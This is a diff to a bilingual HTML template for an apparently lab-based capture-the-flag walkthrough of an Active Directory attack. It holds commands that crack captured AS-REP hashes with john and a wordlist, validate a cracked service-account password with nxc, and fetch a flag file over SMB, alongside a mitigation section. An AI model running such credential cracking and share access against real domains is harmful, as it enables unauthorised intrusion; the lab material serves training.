@@ -115,7 +115,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt captured_asrep.txt</pre>
     <h3>5 · Validar y capturar la flag</h3>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.backup' -p 'Welcome1' --shares
 
-smbclient //{{ ad_dc_ip }}/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-04.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-04.txt'
+cat flag-ad-04.txt</pre>
     <pre>HL{···}</pre>
 
     <h3>Mitigación</h3>
@@ -221,7 +222,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt captured_asrep.txt</pre>
     <h3>5 · Validate and capture the flag</h3>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.backup' -p 'Welcome1' --shares
 
-smbclient //{{ ad_dc_ip }}/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-04.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-04.txt'
+cat flag-ad-04.txt</pre>
     <pre>HL{···}</pre>
 
     <h3>Mitigation</h3>
